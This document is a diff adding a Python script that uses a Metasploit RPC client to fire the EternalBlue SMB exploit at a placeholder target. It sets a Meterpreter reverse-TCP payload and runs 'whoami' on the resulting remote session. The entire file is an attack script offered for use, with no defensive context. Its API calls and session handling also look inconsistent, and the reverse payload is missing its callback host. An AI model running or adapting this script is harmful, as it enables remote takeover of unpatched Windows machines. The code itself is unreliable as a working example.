@@ -1,0 +1,32 @@
+import msfrpc
+import time
+
+# Set up the Metasploit RPC client
+client = msfrpc.Msfrpc({})
+client.login('msf', 'msf')
+
+# Create a new exploit module instance
+module = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+
+# Configure the exploit module with the target IP address and payload
+module['RHOSTS'] = 'TARGET_IP_ADDRESS'
+module['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
+
+# Run the exploit and get the session ID
+print('Exploiting target...')
+job_id = client.jobs.create(module)
+while True:
+    time.sleep(1)
+    job = client.jobs.status(job_id)
+    if job['busy'] == False:
+        session_id = job['data'].split(' ')[2]
+        break
+
+# Get the session object for the new session
+session = client.sessions.session(session_id)
+
+# Execute a command on the remote machine using the new session
+print('Executing command on remote machine...')
+command = 'whoami'
+output = session.shell_execute(command)
+print(output['data'].decode('utf-8'))
